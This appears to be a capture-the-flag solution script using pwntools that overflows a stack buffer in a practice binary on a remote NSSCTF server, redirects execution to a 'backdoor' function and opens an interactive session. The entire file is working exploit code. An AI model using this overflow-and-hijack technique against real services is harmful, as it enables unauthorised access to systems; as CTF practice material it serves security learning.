from pwn import *

# io = process("./pwn")
io = remote("node5.anna.nssctf.cn", 22051)

backdoor = 0x40119B
ret_ = 0x40101A
payload = b"a" * (0x20 + 0x8) + p64(backdoor)

io.send(payload)

io.interactive()
